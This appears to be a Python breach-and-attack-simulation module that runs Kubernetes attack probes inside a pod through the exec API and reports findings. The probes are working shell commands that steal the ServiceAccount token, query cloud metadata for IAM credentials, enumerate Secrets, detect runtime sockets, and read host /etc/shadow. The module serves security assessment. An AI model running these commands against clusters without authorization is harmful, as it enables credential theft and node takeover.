from kubernetes import client, config
from kubernetes.stream import stream


def _connect() -> client.CoreV1Api:
    """Load kube config (local or in-cluster) and return a CoreV1 API client."""
    try:
        config.load_kube_config()
    except config.ConfigException:
        config.load_incluster_config()
    return client.CoreV1Api()


def _exec_in_pod(core_v1: client.CoreV1Api, pod_name: str, namespace: str, command: list[str]) -> str:
    """Execute a shell command inside a running pod via the Kubernetes exec API."""
    return stream(
        core_v1.connect_get_namespaced_pod_exec,
        pod_name,
        namespace,
        command=command,
        stderr=True,
        stdin=False,
        stdout=True,
        tty=False,
    )


def _result(pod_name, namespace, attack, success, details, severity, mitre) -> dict:
    return {
        "pod": pod_name,
        "namespace": namespace,
        "attack": attack,
        "success": success,
        "details": details,
        "severity": severity,
        "mitre": mitre,
    }


# ---------------------------------------------------------------------------
# Individual attack simulations
# ---------------------------------------------------------------------------

def simulate_token_theft(pod_name: str, namespace: str = "default", core_v1: client.CoreV1Api = None) -> dict:
    """Steal the mounted ServiceAccount JWT token (MITRE T1528)."""
    attack, severity, mitre = "read_sa_token", "CRITICAL", "T1528"
    try:
        core_v1 = core_v1 or _connect()
    except config.ConfigException:
        return _result(pod_name, namespace, attack, False, "Could not connect to Kubernetes cluster.", severity, mitre)

    cmd = ["/bin/sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token"]
    try:
        response = _exec_in_pod(core_v1, pod_name, namespace, cmd)
        if response and response.strip().startswith("ey"):
            snippet = response.strip()[:15] + "..."
            return _result(pod_name, namespace, attack, True,
                           f"Successfully extracted ServiceAccount token: {snippet}", severity, mitre)
        return _result(pod_name, namespace, attack, False,
                       f"Attack blocked or failed. Output: {response.strip() if response else 'None'}", severity, mitre)
    except Exception as e:
        return _result(pod_name, namespace, attack, False, f"Attack blocked or failed with error: {e}", severity, mitre)


def simulate_cloud_metadata_theft(pod_name: str, namespace: str = "default", core_v1: client.CoreV1Api = None) -> dict:
    """Reach the cloud instance metadata service to steal cloud IAM credentials (MITRE T1552.005).

    This is one of the most common and damaging attacks in managed cloud clusters
    (EKS / GKE / AKS): a compromised pod queries 169.254.169.254 and walks away with
    the node's cloud credentials, pivoting from the cluster into the cloud account.
    """
    attack, severity, mitre = "cloud_metadata_ssrf", "CRITICAL", "T1552.005"
    try:
        core_v1 = core_v1 or _connect()
    except config.ConfigException:
        return _result(pod_name, namespace, attack, False, "Could not connect to Kubernetes cluster.", severity, mitre)

    aws_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    gcp_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    cmd = ["/bin/sh", "-c",
           f"curl -s --max-time 3 {aws_url} 2>/dev/null || "
           f"wget -qO- --timeout=3 {aws_url} 2>/dev/null || "
           f"curl -s --max-time 3 -H 'Metadata-Flavor: Google' {gcp_url} 2>/dev/null"]
    try:
        response = (_exec_in_pod(core_v1, pod_name, namespace, cmd) or "").strip()
        if response and "access_token" in response.lower():
            return _result(pod_name, namespace, attack, True,
                           "Cloud metadata API reachable and returned an access token (GCP).", severity, mitre)
        if response and "not found" not in response.lower() and "<" not in response:
            return _result(pod_name, namespace, attack, True,
                           f"Cloud metadata API reachable, IAM role(s) exposed: {response[:120]}", severity, mitre)
        return _result(pod_name, namespace, attack, False,
                       "Metadata service unreachable or blocked (no credentials exposed).", severity, mitre)
    except Exception as e:
        return _result(pod_name, namespace, attack, False, f"Attack blocked or failed with error: {e}", severity, mitre)


def simulate_container_socket_escape(pod_name: str, namespace: str = "default", core_v1: client.CoreV1Api = None) -> dict:
    """Detect a mounted container-runtime socket enabling host takeover (MITRE T1610).

    Mounting /var/run/docker.sock (or the containerd socket) into a pod is a frequent
    misconfiguration in CI/CD runners and monitoring agents. Any process that can talk
    to the socket can spawn a privileged container on the node and fully escape.
    """
    attack, severity, mitre = "container_socket_escape", "CRITICAL", "T1610"
    try:
        core_v1 = core_v1 or _connect()
    except config.ConfigException:
        return _result(pod_name, namespace, attack, False, "Could not connect to Kubernetes cluster.", severity, mitre)

    cmd = ["/bin/sh", "-c",
           "ls -la /var/run/docker.sock /run/docker.sock "
           "/run/containerd/containerd.sock /var/run/crio/crio.sock 2>/dev/null"]
    try:
        response = (_exec_in_pod(core_v1, pod_name, namespace, cmd) or "").strip()
        if response and ".sock" in response:
            found = ", ".join(line.split()[-1] for line in response.splitlines() if ".sock" in line)
            return _result(pod_name, namespace, attack, True,
                           f"Container runtime socket mounted into pod: {found}. Host takeover possible.", severity, mitre)
        return _result(pod_name, namespace, attack, False,
                       "No container runtime socket mounted into the pod.", severity, mitre)
    except Exception as e:
        return _result(pod_name, namespace, attack, False, f"Attack blocked or failed with error: {e}", severity, mitre)


def simulate_host_filesystem_access(pod_name: str, namespace: str = "default", core_v1: client.CoreV1Api = None) -> dict:
    """Detect access to the node's filesystem via a hostPath mount (MITRE T1611).

    Mounting the host root (or sensitive host paths) into a pod lets an attacker read
    node secrets, kubelet credentials and other pods' data, or write a payload to gain
    code execution on the node.
    """
    attack, severity, mitre = "host_filesystem_access", "HIGH", "T1611"
    try:
        core_v1 = core_v1 or _connect()
    except config.ConfigException:
        return _result(pod_name, namespace, attack, False, "Could not connect to Kubernetes cluster.", severity, mitre)

    # Probe common hostPath mount points and node-level credential locations.
    cmd = ["/bin/sh", "-c",
           "for p in /host /host/etc /rootfs /host/var/lib/kubelet /var/lib/kubelet/pki; do "
           "[ -e \"$p\" ] && echo \"HOSTPATH:$p\"; done; "
           "cat /host/etc/shadow 2>/dev/null | head -n1"]
    try:
        response = (_exec_in_pod(core_v1, pod_name, namespace, cmd) or "").strip()
        if "HOSTPATH:" in response or response.startswith("root:"):
            paths = ", ".join(line.split("HOSTPATH:")[1] for line in response.splitlines() if line.startswith("HOSTPATH:"))
            detail = f"Host filesystem exposed via hostPath mount(s): {paths or 'node root'}."
            if response.startswith("root:") or "root:" in response:
                detail += " Node /etc/shadow is readable."
            return _result(pod_name, namespace, attack, True, detail, severity, mitre)
        return _result(pod_name, namespace, attack, False,
                       "No host filesystem mount detected inside the pod.", severity, mitre)
    except Exception as e:
        return _result(pod_name, namespace, attack, False, f"Attack blocked or failed with error: {e}", severity, mitre)


def simulate_privilege_recon(pod_name: str, namespace: str = "default", core_v1: client.CoreV1Api = None) -> dict:
    """Check for root user and dangerous Linux capabilities / privileged mode (MITRE T1548)."""
    attack, severity, mitre = "privilege_recon", "HIGH", "T1548"
    try:
        core_v1 = core_v1 or _connect()
    except config.ConfigException:
        return _result(pod_name, namespace, attack, False, "Could not connect to Kubernetes cluster.", severity, mitre)

    cmd = ["/bin/sh", "-c", "id; grep CapEff /proc/self/status 2>/dev/null"]
    try:
        response = (_exec_in_pod(core_v1, pod_name, namespace, cmd) or "").strip()
        is_root = "uid=0(" in response
        cap_sys_admin = False
        cap_value = ""
        for line in response.splitlines():
            if "CapEff" in line:
                cap_value = line.split(":")[-1].strip()
                try:
                    caps = int(cap_value, 16)
                    cap_sys_admin = bool(caps & (1 << 21))  # CAP_SYS_ADMIN
                except ValueError:
                    pass
        if is_root or cap_sys_admin:
            flags = []
            if is_root:
                flags.append("container runs as root (uid=0)")
            if cap_sys_admin:
                flags.append(f"CAP_SYS_ADMIN granted (CapEff={cap_value})")
            return _result(pod_name, namespace, attack, True,
                           "Excessive privileges detected: " + "; ".join(flags) + ".", severity, mitre)
        return _result(pod_name, namespace, attack, False,
                       "Container runs unprivileged as a non-root user.", severity, mitre)
    except Exception as e:
        return _result(pod_name, namespace, attack, False, f"Attack blocked or failed with error: {e}", severity, mitre)


def simulate_env_secret_leak(pod_name: str, namespace: str = "default", core_v1: client.CoreV1Api = None) -> dict:
    """Harvest secrets injected as environment variables (MITRE T1552.007)."""
    attack, severity, mitre = "env_secret_leak", "MEDIUM", "T1552.007"
    try:
        core_v1 = core_v1 or _connect()
    except config.ConfigException:
        return _result(pod_name, namespace, attack, False, "Could not connect to Kubernetes cluster.", severity, mitre)

    keywords = ("PASSWORD", "SECRET", "TOKEN", "APIKEY", "API_KEY", "AWS_", "PRIVATE", "CREDENTIAL", "PASSWD")
    cmd = ["/bin/sh", "-c", "env"]
    try:
        response = (_exec_in_pod(core_v1, pod_name, namespace, cmd) or "").strip()
        leaked = [line.split("=")[0] for line in response.splitlines()
                  if "=" in line and any(k in line.split("=")[0].upper() for k in keywords)]
        if leaked:
            return _result(pod_name, namespace, attack, True,
                           f"Sensitive environment variables exposed: {', '.join(leaked[:8])}.", severity, mitre)
        return _result(pod_name, namespace, attack, False,
                       "No secret-like environment variables found.", severity, mitre)
    except Exception as e:
        return _result(pod_name, namespace, attack, False, f"Attack blocked or failed with error: {e}", severity, mitre)


def simulate_api_server_secrets_enum(pod_name: str, namespace: str = "default", core_v1: client.CoreV1Api = None) -> dict:
    """Use the in-pod ServiceAccount token to list cluster Secrets via the API server (MITRE T1552.007).

    This chains token theft into real impact: if the pod's ServiceAccount is allowed to
    read Secrets, an attacker dumps every credential in the namespace straight from the
    API server.
    """
    attack, severity, mitre = "api_server_secrets_enum", "CRITICAL", "T1552.007"
    try:
        core_v1 = core_v1 or _connect()
    except config.ConfigException:
        return _result(pod_name, namespace, attack, False, "Could not connect to Kubernetes cluster.", severity, mitre)

    api = "https://kubernetes.default.svc/api/v1/namespaces/" + namespace + "/secrets"
    sa = "/var/run/secrets/kubernetes.io/serviceaccount"
    cmd = ["/bin/sh", "-c",
           f"TOKEN=$(cat {sa}/token 2>/dev/null); "
           f"curl -s --max-time 4 --cacert {sa}/ca.crt -H \"Authorization: Bearer $TOKEN\" {api} 2>/dev/null || "
           f"wget -qO- --timeout=4 --ca-certificate={sa}/ca.crt --header=\"Authorization: Bearer $TOKEN\" {api} 2>/dev/null"]
    try:
        response = (_exec_in_pod(core_v1, pod_name, namespace, cmd) or "").strip()
        if '"kind":"SecretList"' in response.replace(" ", ""):
            count = response.count('"type":')
            return _result(pod_name, namespace, attack, True,
                           f"ServiceAccount can list Secrets via the API server (~{count} secret(s) exposed).", severity, mitre)
        if '"code":403' in response.replace(" ", "") or "forbidden" in response.lower():
            return _result(pod_name, namespace, attack, False,
                           "API server reachable, but RBAC denied access to Secrets (403 Forbidden).", severity, mitre)
        return _result(pod_name, namespace, attack, False,
                       "Could not enumerate Secrets via the API server.", severity, mitre)
    except Exception as e:
        return _result(pod_name, namespace, attack, False, f"Attack blocked or failed with error: {e}", severity, mitre)


# Registry of all available simulations, ordered by impact.
SIMULATIONS = [
    simulate_token_theft,
    simulate_api_server_secrets_enum,
    simulate_cloud_metadata_theft,
    simulate_container_socket_escape,
    simulate_host_filesystem_access,
    simulate_privilege_recon,
    simulate_env_secret_leak,
]


def run_all_simulations(pod_name: str, namespace: str = "default") -> dict:
    """Run the full BAS suite against a target pod and return aggregated results."""
    try:
        core_v1 = _connect()
    except config.ConfigException:
        return {
            "pod": pod_name,
            "namespace": namespace,
            "error": "Could not connect to Kubernetes cluster.",
            "results": [],
        }

    results = [sim(pod_name, namespace, core_v1=core_v1) for sim in SIMULATIONS]
    return {
        "pod": pod_name,
        "namespace": namespace,
        "compromised": any(r["success"] for r in results),
        "exploited_count": sum(1 for r in results if r["success"]),
        "results": results,
    }
